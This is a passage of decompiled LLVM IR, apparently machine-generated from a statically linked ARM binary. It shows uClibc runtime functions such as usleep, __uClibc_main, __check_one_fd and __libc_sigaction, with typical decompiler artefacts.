  %v0_134a0 = call i32 @__sigaddset()
  store i32 %v0_134a0, i32* %r0.global-to-local, align 4
  %v1_134a4 = load i32, i32* @r5, align 4
  %v5_134a8 = icmp slt i32 %v0_134a0, %v1_134a4
  br i1 %v5_134a8, label %dec_label_pc_135ec, label %dec_label_pc_134ac

dec_label_pc_134ac:                               ; preds = %dec_label_pc_13488
  %v2_134ac = ptrtoint i32* %stack_var_-284 to i32
  store i32 %v2_134ac, i32* @r4, align 4
  store i32 %v1_134a4, i32* %r0.global-to-local, align 4
  store i32 %v2_13488, i32* %r1.global-to-local, align 4
  %v3_134bc = bitcast i32* %stack_var_-156 to %_TYPEDEF_sigset_t*
  %v4_134bc = call i32 @__GI_sigprocmask(i32 %v1_134a4, %_TYPEDEF_sigset_t* %v3_134bc, i32 %v2_134ac)
  store i32 %v4_134bc, i32* %r0.global-to-local, align 4
  %v1_134c0 = load i32, i32* @r5, align 4
  %v9_134c0 = icmp eq i32 %v4_134bc, %v1_134c0
  br i1 %v9_134c0, label %dec_label_pc_134c8, label %dec_label_pc_135ec

dec_label_pc_134c8:                               ; preds = %dec_label_pc_134ac
  store i32 17, i32* %r1.global-to-local, align 4
  store i32 %v2_134ac, i32* %r0.global-to-local, align 4
  %v2_134d0 = call i32 @__sigismember(i32 %v2_134ac, i32 17)
  store i32 %v2_134d0, i32* %r0.global-to-local, align 4
  %v1_134d4 = load i32, i32* @r5, align 4
  %v9_134d4 = icmp eq i32 %v2_134d0, %v1_134d4
  br i1 %v9_134d4, label %dec_label_pc_134ec.preheader, label %dec_label_pc_134c8.dec_label_pc_135b4_crit_edge

dec_label_pc_134c8.dec_label_pc_135b4_crit_edge:  ; preds = %dec_label_pc_134c8
  %.pre = ptrtoint i32* %stack_var_-28 to i32
  br label %dec_label_pc_135b4

dec_label_pc_134ec.preheader:                     ; preds = %dec_label_pc_134c8
  store i32 31, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_134e4

dec_label_pc_134e4:                               ; preds = %dec_label_pc_134ec.preheader, %dec_label_pc_134e4
  %v5_134f416 = phi i32 [ %v5_1348017, %dec_label_pc_134ec.preheader ], [ %v5_134f4, %dec_label_pc_134e4 ]
  %v2_134e8 = add i32 %v5_134f416, -136
  %v3_134e8 = inttoptr i32 %v2_134e8 to i32*
  store i32 0, i32* %v3_134e8, align 4
  %v0_134ec.pre = load i32, i32* %r1.global-to-local, align 4
  %v1_134ec = add i32 %v0_134ec.pre, -1
  store i32 %v1_134ec, i32* %r1.global-to-local, align 4
  %v6_134ec = icmp slt i32 %v1_134ec, 0
  %v4_134f4 = mul i32 %v1_134ec, 4
  %v5_134f4 = add i32 %v4_134f4, %v16_13458
  br i1 %v6_134ec, label %dec_label_pc_134fc, label %dec_label_pc_134e4

dec_label_pc_134fc:                               ; preds = %dec_label_pc_134e4
  store i32 %v2_13488, i32* @r0, align 4
  store i32 17, i32* @r1, align 4
  %v0_13504 = call i32 @__sigaddset()
  store i32 %v0_13504, i32* %r0.global-to-local, align 4
  %v1_13508 = icmp slt i32 %v0_13504, 0
  br i1 %v1_13508, label %dec_label_pc_135ec, label %dec_label_pc_13510

dec_label_pc_13510:                               ; preds = %dec_label_pc_134fc
  store i32 17, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  %v4_1351c = call i32 @__libc_sigaction(i32 17, i32* null, i32 %v2_13460)
  store i32 %v4_1351c, i32* %r0.global-to-local, align 4
  %v1_13520 = icmp slt i32 %v4_1351c, 0
  br i1 %v1_13520, label %dec_label_pc_13528, label %dec_label_pc_13550

dec_label_pc_13528:                               ; preds = %dec_label_pc_13510
  %v0_13528 = call i32 @__errno_location()
  store i32 %v2_134ac, i32* %r1.global-to-local, align 4
  store i32 %v0_13528, i32* %r5.global-to-local, align 4
  store i32 2, i32* %r0.global-to-local, align 4
  %v1_1353c = inttoptr i32 %v0_13528 to i32*
  %v2_1353c = load i32, i32* %v1_1353c, align 4
  store i32 %v2_1353c, i32* @r4, align 4
  %v3_13540 = bitcast i32* %stack_var_-284 to %_TYPEDEF_sigset_t*
  %v4_13540 = call i32 @__GI_sigprocmask(i32 2, %_TYPEDEF_sigset_t* %v3_13540, i32 0)
  store i32 -1, i32* %r0.global-to-local, align 4
  %v0_13548 = load i32, i32* @r4, align 4
  %v1_13548 = load i32, i32* %r5.global-to-local, align 4
  %v2_13548 = inttoptr i32 %v1_13548 to i32*
  store i32 %v0_13548, i32* %v2_13548, align 4
  %v17_135f4.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_135f0

dec_label_pc_13550:                               ; preds = %dec_label_pc_13510
  %v2_13550 = load i32, i32* %stack_var_-424, align 4
  %v7_13554 = icmp eq i32 %v2_13550, 1
  %v2_1355c = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_1355c, i32* @r4, align 4
  br i1 %v7_13554, label %dec_label_pc_13564, label %dec_label_pc_13598

dec_label_pc_13564:                               ; preds = %dec_label_pc_13550
  store i32 %v2_1355c, i32* %r1.global-to-local, align 4
  store i32 %v2_1355c, i32* %r0.global-to-local, align 4
  %v2_1356c = bitcast i32* %stack_var_-28 to %timespec*
  %v3_1356c = call i32 @__libc_nanosleep(%timespec* %v2_1356c, i32 %v2_1355c)
  store i32 %v3_1356c, i32* %r0.global-to-local, align 4
  store i32 %v3_1356c, i32* %r6.global-to-local, align 4
  %v0_13574 = call i32 @__errno_location()
  store i32 %v2_134ac, i32* %r1.global-to-local, align 4
  store i32 %v0_13574, i32* %r5.global-to-local, align 4
  store i32 2, i32* %r0.global-to-local, align 4
  %v1_13588 = inttoptr i32 %v0_13574 to i32*
  %v2_13588 = load i32, i32* %v1_13588, align 4
  store i32 %v2_13588, i32* @r4, align 4
  %v3_1358c = bitcast i32* %stack_var_-284 to %_TYPEDEF_sigset_t*
  %v4_1358c = call i32 @__GI_sigprocmask(i32 2, %_TYPEDEF_sigset_t* %v3_1358c, i32 0)
  store i32 %v4_1358c, i32* %r0.global-to-local, align 4
  %v0_13590 = load i32, i32* @r4, align 4
  %v1_13590 = load i32, i32* %r5.global-to-local, align 4
  %v2_13590 = inttoptr i32 %v1_13590 to i32*
  store i32 %v0_13590, i32* %v2_13590, align 4
  %v0_135c0.pr = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_135c0

dec_label_pc_13598:                               ; preds = %dec_label_pc_13550
  store i32 %v2_134ac, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r0.global-to-local, align 4
  %v3_135a4 = bitcast i32* %stack_var_-284 to %_TYPEDEF_sigset_t*
  %v4_135a4 = call i32 @__GI_sigprocmask(i32 2, %_TYPEDEF_sigset_t* %v3_135a4, i32 0)
  store i32 %v4_135a4, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_135b4

dec_label_pc_135b4:                               ; preds = %dec_label_pc_134c8.dec_label_pc_135b4_crit_edge, %dec_label_pc_13598
  %storemerge.pre-phi = phi i32 [ %.pre, %dec_label_pc_134c8.dec_label_pc_135b4_crit_edge ], [ %v2_1355c, %dec_label_pc_13598 ]
  store i32 %storemerge.pre-phi, i32* %r0.global-to-local, align 4
  store i32 %storemerge.pre-phi, i32* %r1.global-to-local, align 4
  %v2_135b8 = bitcast i32* %stack_var_-28 to %timespec*
  %v3_135b8 = call i32 @__libc_nanosleep(%timespec* %v2_135b8, i32 %storemerge.pre-phi)
  store i32 %v3_135b8, i32* %r0.global-to-local, align 4
  store i32 %v3_135b8, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_135c0

dec_label_pc_135c0:                               ; preds = %dec_label_pc_13564, %dec_label_pc_135b4
  %v0_135c0 = phi i32 [ %v0_135c0.pr, %dec_label_pc_13564 ], [ %v3_135b8, %dec_label_pc_135b4 ]
  %v2_135c0 = icmp eq i32 %v0_135c0, 0
  br i1 %v2_135c0, label %dec_label_pc_135e4, label %dec_label_pc_135c8

dec_label_pc_135c8:                               ; preds = %dec_label_pc_135c0
  store i32 0, i32* %r1.global-to-local, align 4
  %v3_135d0 = load i32, i32* %stack_var_-28, align 4
  store i32 %v3_135d0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_135f0

dec_label_pc_135e4:                               ; preds = %entry, %dec_label_pc_135c0
  store i32 0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_135f0

dec_label_pc_135ec:                               ; preds = %dec_label_pc_134ac, %dec_label_pc_134fc, %dec_label_pc_13488
  store i32 -1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_135f0

dec_label_pc_135f0:                               ; preds = %dec_label_pc_135c8, %dec_label_pc_135e4, %dec_label_pc_13528, %dec_label_pc_135ec
  %v17_135f4 = phi i32 [ %v3_135d0, %dec_label_pc_135c8 ], [ 0, %dec_label_pc_135e4 ], [ %v17_135f4.pre, %dec_label_pc_13528 ], [ -1, %dec_label_pc_135ec ]
  %v2_135f4 = load i32, i32* %stack_var_-20, align 4
  store i32 %v2_135f4, i32* @r4, align 4
  store i32 %v6_13458, i32* @r5, align 4
  store i32 %v9_13458, i32* @r6, align 4
  ret i32 %v17_135f4

; uselistorder directives
  uselistorder i32 %storemerge.pre-phi, { 1, 2, 0 }
  uselistorder i32 %v2_1355c, { 0, 3, 1, 2, 4 }
  uselistorder i32 %v1_134ec, { 0, 2, 1 }
  uselistorder i32 %v2_134ac, { 0, 1, 2, 4, 3, 5, 6 }
  uselistorder i32 %v1_134a4, { 1, 0, 2 }
  uselistorder i32 %v1_13478, { 0, 2, 1 }
  uselistorder i32 %v16_13458, { 1, 2, 0 }
  uselistorder i32* %stack_var_-20, { 0, 2, 1 }
  uselistorder i32* %stack_var_-284, { 2, 1, 0, 3 }
  uselistorder i32* %stack_var_-28, { 3, 2, 1, 5, 0, 4 }
  uselistorder i32* %r1.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 11, 12, 8, 9, 10, 13, 14 }
  uselistorder i32* %r0.global-to-local, { 2, 3, 4, 5, 1, 7, 6, 9, 8, 11, 10, 13, 14, 12, 16, 15, 17, 19, 18, 21, 20, 22, 0 }
  uselistorder i32 (i32, i32*, i32)* @__libc_sigaction, { 0, 2, 1 }
  uselistorder i32 (i32, i32)* @__sigismember, { 1, 0 }
  uselistorder i32 ()* @__sigaddset, { 3, 2, 0, 1, 4 }
  uselistorder i32 -136, { 1, 2, 3, 0 }
  uselistorder label %dec_label_pc_135f0, { 3, 1, 0, 2 }
  uselistorder label %dec_label_pc_135ec, { 1, 0, 2 }
  uselistorder label %dec_label_pc_135e4, { 1, 0 }
  uselistorder label %dec_label_pc_135c0, { 1, 0 }
  uselistorder label %dec_label_pc_135b4, { 1, 0 }
  uselistorder label %dec_label_pc_134e4, { 1, 0 }
  uselistorder label %dec_label_pc_13470, { 1, 0 }
}

define i32 @usleep(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-20 = alloca i32, align 4
  %v3_135fc = load i32, i32* @r4, align 4
  store i32 1000000, i32* @r4, align 4
  %v2_13610 = udiv i32 %arg1, 1000000
  store i32 %v2_13610, i32* %stack_var_-20, align 4
  %v2_13638 = bitcast i32* %stack_var_-20 to %timespec*
  %v3_13638 = call i32 @__libc_nanosleep(%timespec* %v2_13638, i32 0)
  store i32 %v3_135fc, i32* @r4, align 4
  ret i32 %v3_13638

; uselistorder directives
  uselistorder i32 (%timespec*, i32)* @__libc_nanosleep, { 2, 0, 1 }
}

define i32 @__GI___uClibc_fini(i32 %arg1) local_unnamed_addr {
dec_label_pc_13674:
  %stack_var_-8 = alloca i32, align 4
  %v3_13648 = load i32, i32* @r4, align 4
  store i32 %v3_13648, i32* %stack_var_-8, align 4
  %v2_13678 = load i32, i32* @global_var_28ab0.526, align 4
  %v2_1367c = icmp eq i32 %v2_13678, 0
  br i1 %v2_1367c, label %.thread, label %bb

bb:                                               ; preds = %dec_label_pc_13674
  call void @__pseudo_branch(i32 %v2_13678)
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_13674, %bb
  %v2_1368c = load i32, i32* @global_var_28ab4.528, align 4
  %v2_13690 = icmp eq i32 %v2_1368c, 0
  br i1 %v2_13690, label %bb12, label %bb13

bb12:                                             ; preds = %.thread
  %v3_13694 = load i32, i32* %stack_var_-8, align 4
  store i32 %v3_13694, i32* @r4, align 4
  %v9_13694 = load i32, i32* @r0, align 4
  ret i32 %v9_13694

bb13:                                             ; preds = %.thread
  call void @__pseudo_branch(i32 %v2_1368c)
  %v2_136a0 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_136a0, i32* @r4, align 4
  %v8_136a0 = load i32, i32* @r0, align 4
  ret i32 %v8_136a0

; uselistorder directives
  uselistorder label %.thread, { 1, 0 }
}

define i32 @__pthread_return_0() local_unnamed_addr {
entry:
  ret i32 0
}

define i32 @__pthread_return_void() local_unnamed_addr {
entry:
  %v1_136bc = load i32, i32* @r0, align 4
  ret i32 %v1_136bc
}

define i32 @__check_one_fd(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r5.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_136c0 = load i32, i32* @r4, align 4
  store i32 %v3_136c0, i32* %stack_var_-12, align 4
  store i32 %arg2, i32* @r4, align 4
  store i32 %arg1, i32* %r5.global-to-local, align 4
  %v2_136d0 = call i32 @__libc_fcntl(i32 %arg1, i32 1)
  %v7_136d4 = icmp eq i32 %v2_136d0, -1
  br i1 %v7_136d4, label %bb4, label %bb

bb:                                               ; preds = %entry
  %v3_136d8 = load i32, i32* %stack_var_-12, align 4
  store i32 %v3_136d8, i32* @r4, align 4
  ret i32 %v2_136d0

bb4:                                              ; preds = %entry
  %v0_136dc = load i32, i32* @r4, align 4
  %v4_136e4 = call i32 @__libc_open(i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_19f30.531, i32 0, i32 0), i32 %v0_136dc)
  %v1_136e8 = load i32, i32* %r5.global-to-local, align 4
  %v9_136e8 = icmp eq i32 %v4_136e4, %v1_136e8
  br i1 %v9_136e8, label %bb5, label %bb6

bb5:                                              ; preds = %bb4
  %v3_136ec = load i32, i32* %stack_var_-12, align 4
  store i32 %v3_136ec, i32* @r4, align 4
  ret i32 %v4_136e4

bb6:                                              ; preds = %bb4
  %v0_136f0 = call i32 @abort()
  %v0_136f4 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_136f4, label %bb7, label %bb8

bb7:                                              ; preds = %bb6
  br label %bb8

bb8:                                              ; preds = %bb6, %bb7
  ret i32 %v0_136f0

; uselistorder directives
  uselistorder i32 %v2_136d0, { 1, 0 }
  uselistorder i32 ()* @abort, { 0, 2, 1, 3 }
  uselistorder i32 (i8*, i32)* @__libc_open, { 3, 2, 0, 1 }
  uselistorder i32 (i32, i32)* @__libc_fcntl, { 0, 5, 9, 8, 7, 6, 4, 3, 2, 1 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %bb8, { 1, 0 }
}

define i32 @__GI___uClibc_init(i32 %arg1) local_unnamed_addr {
entry:
  %v2_136fc = load i32, i32* @global_var_28ab8.533, align 4
  %v2_13700 = icmp eq i32 %v2_136fc, 0
  br i1 %v2_13700, label %bb3, label %bb

bb:                                               ; preds = %entry
  %v6_1370c = load i32, i32* @r0, align 4
  ret i32 %v6_1370c

bb3:                                              ; preds = %entry
  store i32 1, i32* @global_var_28ab8.533, align 4
  store i32 4096, i32* @global_var_28aac.293, align 4
  %v0_13740 = call i32 @_stdio_init()
  ret i32 %v0_13740
}

define i32 @__uClibc_main(i32 %arg1, i32 %arg2, i32* %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
entry:
  %tmp = ptrtoint i32* %arg3 to i32
  %tmp35 = call i32 @__decompiler_undefined_function_0()
  %tmp36 = call i32 @__decompiler_undefined_function_0()
  %tmp37 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-120 = alloca i32, align 4
  store i32 %tmp, i32* @r6, align 4
  %v4_13758 = mul i32 %arg2, 4
  %v5_13758 = add i32 %tmp, %v4_13758
  %v2_1375c = load i32, i32* %arg3, align 4
  %v2_13760 = ptrtoint i32* %stack_var_-120 to i32
  %v1_13764 = add i32 %v5_13758, 4
  store i32 %v1_13764, i32* @ip, align 4
  %v9_13768 = icmp eq i32 %v1_13764, %v2_1375c
  store i32 %arg2, i32* @r8, align 4
  store i32 %arg7, i32* @global_var_28aa4.539, align 4
  store i32 %v1_13764, i32* @global_var_28aa8.519, align 4
  store i32 %arg6, i32* @global_var_28ab4.528, align 4
  store i32 120, i32* @r2, align 4
  br i1 %v9_13768, label %bb, label %bb41

bb:                                               ; preds = %entry
  store i32 %v5_13758, i32* @global_var_28aa8.519, align 4
  br label %bb41

bb41:                                             ; preds = %entry, %bb
  store i32 %arg4, i32* @r7, align 4
  %v2_137a8 = bitcast i32* %stack_var_-120 to i8*
  %v3_137a8 = call i32 @__GI_memset(i8* %v2_137a8, i32 0)
  %storemerge.pre = load i32, i32* @global_var_28aa8.519, align 4
  br label %dec_label_pc_137b8

dec_label_pc_137b8:                               ; preds = %dec_label_pc_137b8, %bb41
  %storemerge = phi i32 [ %storemerge.pre, %bb41 ], [ %v4_137b8, %dec_label_pc_137b8 ]
  %v1_137b8 = inttoptr i32 %storemerge to i32*
  %v2_137b8 = load i32, i32* %v1_137b8, align 4
  %v4_137b8 = add i32 %storemerge, 4
  %v2_137bc = icmp eq i32 %v2_137b8, 0
  br i1 %v2_137bc, label %dec_label_pc_137c8, label %dec_label_pc_137b8

dec_label_pc_137c8:                               ; preds = %dec_label_pc_137b8
  store i32 %v4_137b8, i32* @r4, align 4
  %v1_137e822 = inttoptr i32 %v4_137b8 to i32*
  %v2_137e823 = load i32, i32* %v1_137e822, align 4
  %v2_137ec25 = icmp eq i32 %v2_137e823, 0
  br i1 %v2_137ec25, label %dec_label_pc_137f4, label %dec_label_pc_137d0

dec_label_pc_137d0:                               ; preds = %dec_label_pc_137c8, %dec_label_pc_137e8
  %v5_137d4 = phi i32 [ %v2_137e8, %dec_label_pc_137e8 ], [ %v2_137e823, %dec_label_pc_137c8 ]
  %v2_137d0 = icmp ugt i32 %v5_137d4, 13
  %v7_137d0 = icmp eq i32 %v5_137d4, 14
  %v2_137d4 = xor i1 %v2_137d0, true
  %v3_137d4 = or i1 %v7_137d0, %v2_137d4
  br i1 %v3_137d4, label %bb42, label %bb43

bb42:                                             ; preds = %dec_label_pc_137d0
  %v6_137d4 = and i32 %v5_137d4, 536870912
  %v7_137d4 = icmp ne i32 %v6_137d4, 0
  br label %bb43

bb43:                                             ; preds = %dec_label_pc_137d0, %bb42
  %v1_137e0 = phi i1 [ %v2_137d0, %dec_label_pc_137d0 ], [ %v7_137d4, %bb42 ]
  %v2_137d8 = xor i1 %v1_137e0, true
  %v3_137d8 = or i1 %v7_137d0, %v2_137d8
  br i1 %v3_137d8, label %bb44, label %dec_label_pc_137e8

bb44:                                             ; preds = %bb43
  br label %dec_label_pc_137e8

dec_label_pc_137e8:                               ; preds = %bb43, %bb44
  call void @__pseudo_cond_branch(i1 %v3_137d8, i32 ptrtoint (i32* @global_var_11650.542 to i32))
  %v0_137e4 = load i32, i32* @r4, align 4
  %v1_137e4 = add i32 %v0_137e4, 8
  store i32 %v1_137e4, i32* @r4, align 4
  %v1_137e8 = inttoptr i32 %v1_137e4 to i32*
  %v2_137e8 = load i32, i32* %v1_137e8, align 4
  %v2_137ec = icmp eq i32 %v2_137e8, 0
  br i1 %v2_137ec, label %dec_label_pc_137f4, label %dec_label_pc_137d0

dec_label_pc_137f4:                               ; preds = %dec_label_pc_137e8, %dec_label_pc_137c8
  %v1_137f8 = call i32 @_dl_aux_init(i32 %v2_13760)
  store i32 %v1_137f8, i32* @r0, align 4
  %v1_137fc = call i32 @__GI___uClibc_init(i32 %v1_137f8)
  store i32 %v1_137fc, i32* @r0, align 4
  %v2_13808 = icmp eq i32 %tmp37, 0
  br i1 %v2_13808, label %bb45, label %bb46

bb45:                                             ; preds = %dec_label_pc_137f4
  br label %bb46

bb46:                                             ; preds = %dec_label_pc_137f4, %bb45
  %v0_13818 = phi i32 [ %tmp37, %dec_label_pc_137f4 ], [ 4096, %bb45 ]
  %v3_13810 = icmp eq i32 %tmp36, -1
  %v8_13810 = icmp eq i32 %tmp36, -1
  store i32 ptrtoint (i32* @global_var_28aac.293 to i32), i32* @r2, align 4
  store i32 %v0_13818, i32* @global_var_28aac.293, align 4
  br i1 %v3_13810, label %dec_label_pc_13820, label %dec_label_pc_13848

dec_label_pc_13820:                               ; preds = %bb46
  %v0_13820 = call i32 @getuid()
  store i32 %v0_13820, i32* @r0, align 4
  store i32 %v0_13820, i32* @r4, align 4
  %v0_13828 = call i32 @geteuid()
  %v0_1382c = load i32, i32* @r4, align 4
  %v9_1382c = icmp eq i32 %v0_1382c, %v0_13828
  br i1 %v9_1382c, label %dec_label_pc_13834, label %dec_label_pc_13870

dec_label_pc_13834:                               ; preds = %dec_label_pc_13820
  %v1_13834 = call i32 @getgid(i32 %v0_13828)
  store i32 %v1_13834, i32* @r0, align 4
  store i32 %v1_13834, i32* @r4, align 4
  %v0_1383c = call i32 @getegid()
  %v0_13840 = load i32, i32* @r4, align 4
  %v9_13840 = icmp eq i32 %v0_13840, %v0_1383c
  br i1 %v9_13840, label %dec_label_pc_13848, label %dec_label_pc_13870

dec_label_pc_13848:                               ; preds = %dec_label_pc_13834, %bb46
  store i32 %tmp36, i32* @r2, align 4
  br i1 %v8_13810, label %dec_label_pc_138dc, label %dec_label_pc_13854

dec_label_pc_13854:                               ; preds = %dec_label_pc_13848
  %v9_13858 = icmp eq i32 %tmp36, %tmp35
  br i1 %v9_13858, label %dec_label_pc_13860, label %dec_label_pc_13870

dec_label_pc_13860:                               ; preds = %dec_label_pc_13854
  br label %dec_label_pc_13870

dec_label_pc_13870:                               ; preds = %dec_label_pc_13860, %dec_label_pc_13854, %dec_label_pc_13834, %dec_label_pc_13820
  %v2_13878 = call i32 @__check_one_fd(i32 0, i32 32768)
  %v2_13884 = call i32 @__check_one_fd(i32 1, i32 32770)
  %v2_13890 = call i32 @__check_one_fd(i32 2, i32 32770)
  br label %dec_label_pc_138dc

dec_label_pc_138dc:                               ; preds = %dec_label_pc_13870, %dec_label_pc_13848
  %v0_138a0 = load i32, i32* @r6, align 4
  %v1_138a0 = inttoptr i32 %v0_138a0 to i32*
  %v2_138a0 = load i32, i32* %v1_138a0, align 4
  store i32 %v2_138a0, i32* @global_var_2281c, align 4
  store i32 %arg5, i32* @global_var_28ab0.526, align 4
  %v2_138dc = icmp eq i32 %arg4, 0
  br i1 %v2_138dc, label %dec_label_pc_13918, label %bb47

bb47:                                             ; preds = %dec_label_pc_138dc
  br label %dec_label_pc_13918

dec_label_pc_13918:                               ; preds = %dec_label_pc_138dc, %bb47
  call void @__pseudo_branch(i32 %arg4)
  store i32 0, i32* @r5, align 4
  %v1_13928 = call i32 @__errno_location()
  %v2_13930 = inttoptr i32 %v1_13928 to i32*
  store i32 0, i32* %v2_13930, align 4
  %v1_13944 = call i32 @__GI___h_errno_location()
  %v2_1394c = inttoptr i32 %v1_13944 to i32*
  store i32 0, i32* %v2_1394c, align 4
  %v0_1395c = load i32, i32* @r8, align 4
  call void @__pseudo_branch(i32 %arg1)
  %v1_13968 = call i32 @__GI_exit(i32 %v0_1395c)
  ret i32 %v1_13968

; uselistorder directives
  uselistorder i32 %v2_137e8, { 1, 0 }
  uselistorder i32 %v1_137e4, { 1, 0 }
  uselistorder i1 %v2_137d0, { 1, 0 }
  uselistorder i32 %v4_137b8, { 1, 0, 2 }
  uselistorder i32 %storemerge, { 1, 0 }
  uselistorder i32 %tmp36, { 1, 3, 0, 2 }
  uselistorder i32 (i32)* @__GI_exit, { 0, 6, 5, 1, 2, 4, 3 }
  uselistorder i32 (i32, i32)* @__check_one_fd, { 2, 1, 0 }
  uselistorder i32* @global_var_28aac.293, { 1, 5, 0, 2, 3, 4 }
  uselistorder i32 4096, { 2, 3, 13, 6, 14, 4, 1, 10, 5, 7, 8, 11, 12, 0, 9 }
  uselistorder i32 14, { 1, 0 }
  uselistorder i32 13, { 1, 2, 0 }
  uselistorder i32 120, { 1, 0 }
  uselistorder i32 %arg4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_13918, { 1, 0 }
  uselistorder label %bb46, { 1, 0 }
  uselistorder label %dec_label_pc_137e8, { 1, 0 }
  uselistorder label %bb43, { 1, 0 }
  uselistorder label %dec_label_pc_137d0, { 1, 0 }
  uselistorder label %bb41, { 1, 0 }
}

define i32 @__libc_sigaction(i32 %arg1, i32* %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg2 to i32
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-284 = alloca i32, align 4
  %stack_var_-156 = alloca i32, align 4
  %stack_var_-144 = alloca i32, align 4
  %stack_var_-296 = alloca i32, align 4
  %v3_139a0 = load i32, i32* @r4, align 4
  %v6_139a0 = load i32, i32* @r5, align 4
  store i32 %tmp, i32* @r4, align 4
  %v2_139a4 = icmp eq i32* %arg2, null
  %v2_139a8 = ptrtoint i32* %stack_var_-296 to i32
  store i32 %arg1, i32* %r6.global-to-local, align 4
  store i32 %arg3, i32* @r5, align 4
  br i1 %v2_139a4, label %dec_label_pc_13a14, label %dec_label_pc_139b8

dec_label_pc_139b8:                               ; preds = %entry
  %v2_139bc = load i32, i32* %arg2, align 4
  %v4_139bc = add i32 %tmp, 4
  store i32 %v4_139bc, i32* @r1, align 4
  %v2_139c0 = ptrtoint i32* %stack_var_-144 to i32
  store i32 %v2_139c0, i32* @r0, align 4
  store i32 128, i32* @r2, align 4
  store i32 %v2_139bc, i32* %stack_var_-156, align 4
  %v0_139cc = call i32 @memcpy()
  store i32 %v0_139cc, i32* %r0.global-to-local, align 4
  %v0_139d0 = load i32, i32* @r4, align 4
  %v1_139d0 = add i32 %v0_139d0, 132
  %v2_139d0 = inttoptr i32 %v1_139d0 to i32*
  %v3_139d0 = load i32, i32* %v2_139d0, align 4
  %v1_139d4 = and i32 %v3_139d0, 67108864
  %v2_139d4 = icmp eq i32 %v1_139d4, 0
  br i1 %v2_139d4, label %dec_label_pc_139e8, label %bb

bb:                                               ; preds = %dec_label_pc_139b8
  br label %dec_label_pc_13a04

dec_label_pc_139e8:                               ; preds = %dec_label_pc_139b8
  %v1_139f0 = and i32 %v3_139d0, 4
  %v2_139f0 = icmp eq i32 %v1_139f0, 0
  br i1 %v2_139f0, label %bb21, label %bb20

bb20:                                             ; preds = %dec_label_pc_139e8
  br label %bb21

bb21:                                             ; preds = %dec_label_pc_139e8, %bb20
  br label %dec_label_pc_13a04

dec_label_pc_13a04:                               ; preds = %bb, %bb21
  %v2_13a04 = icmp eq i32 %v0_139d0, 0
  %v3_13a08 = ptrtoint i32* %stack_var_-156 to i32
  %.v3_13a08 = select i1 %v2_13a04, i32 0, i32 %v3_13a08
  %v0_13a14.pre = load i32, i32* @r5, align 4
  %v0_13a24.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_13a14

dec_label_pc_13a14:                               ; preds = %dec_label_pc_13a04, %entry
  %v0_13a24 = phi i32 [ %arg1, %entry ], [ %v0_13a24.pre, %dec_label_pc_13a04 ]
  %v0_13a14 = phi i32 [ %arg3, %entry ], [ %v0_13a14.pre, %dec_label_pc_13a04 ]
  %storemerge = phi i32 [ 0, %entry ], [ %.v3_13a08, %dec_label_pc_13a04 ]
  store i32 %storemerge, i32* @r1, align 4
  %v2_13a14 = icmp eq i32 %v0_13a14, 0
  %.v2_139a8 = select i1 %v2_13a14, i32 0, i32 %v2_139a8
  store i32 %.v2_139a8, i32* @r2, align 4
  store i32 %v0_13a24, i32* %r0.global-to-local, align 4
  %v1_13a28 = call i32 @__syscall_rt_sigaction(i32 %v0_13a24)
  store i32 %v1_13a28, i32* %r0.global-to-local, align 4
  %v0_13a2c = load i32, i32* @r5, align 4
  %v2_13a2c = icmp eq i32 %v0_13a2c, 0
  br i1 %v2_13a2c, label %bb26, label %bb25

bb25:                                             ; preds = %dec_label_pc_13a14
  br label %bb26

bb26:                                             ; preds = %dec_label_pc_13a14, %bb25
  %v0_13a3c.pr = phi i32 [ 0, %dec_label_pc_13a14 ], [ 1, %bb25 ]
  %v1_13a34 = icmp slt i32 %v1_13a28, 0
  br i1 %v1_13a34, label %thread-pre-split.thread, label %thread-pre-split

thread-pre-split.thread:                          ; preds = %bb26
  br label %dec_label_pc_13a70

thread-pre-split:                                 ; preds = %bb26
  %v2_13a3c = icmp eq i32 %v0_13a3c.pr, 0
  store i32 %v1_13a28, i32* @r4, align 4
  br i1 %v2_13a3c, label %dec_label_pc_13a70, label %dec_label_pc_13a48

dec_label_pc_13a48:                               ; preds = %thread-pre-split
  %v2_13a48 = load i32, i32* %stack_var_-296, align 4
  store i32 %v0_13a2c, i32* %r0.global-to-local, align 4
  %v2_13a50 = inttoptr i32 %v0_13a2c to i32*
  store i32 %v2_13a48, i32* %v2_13a50, align 4
  %v3_13a50 = load i32, i32* %r0.global-to-local, align 4
  %v4_13a50 = add i32 %v3_13a50, 4
  store i32 %v4_13a50, i32* @r0, align 4
  %v2_13a54 = ptrtoint i32* %stack_var_-284 to i32
  store i32 %v2_13a54, i32* @r1, align 4
  store i32 128, i32* @r2, align 4
  %v0_13a5c = call i32 @memcpy()
  store i32 %v0_13a5c, i32* %r0.global-to-local, align 4
  %v1_13a64 = load i32, i32* @r5, align 4
  %v2_13a64 = add i32 %v1_13a64, 136
  %v3_13a64 = inttoptr i32 %v2_13a64 to i32*
  %v1_13a6c = load i32, i32* @r5, align 4
